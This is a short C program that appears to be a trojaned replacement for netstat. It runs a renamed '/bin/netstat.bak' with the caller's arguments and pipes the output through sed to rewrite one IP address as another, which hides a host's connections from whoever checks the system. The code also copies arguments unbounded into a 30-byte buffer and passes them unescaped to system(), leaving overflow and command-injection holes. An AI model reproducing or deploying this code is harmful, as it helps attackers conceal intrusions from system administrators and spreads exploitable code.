#include<stdio.h>

int main (int argc, char* argv[])
{
	static char CMD[30];
	int i;
	strcat(CMD,"/bin/netstat.bak ");
	for(i = 1; i< argc;i++)
	{
		strcat(CMD,argv[i]);
		strcat(CMD," ");	
	}
	strcat(CMD,"| sed s%172.16.143.132%172.16.144.130%"); 
	system(CMD);
	return 0;
}
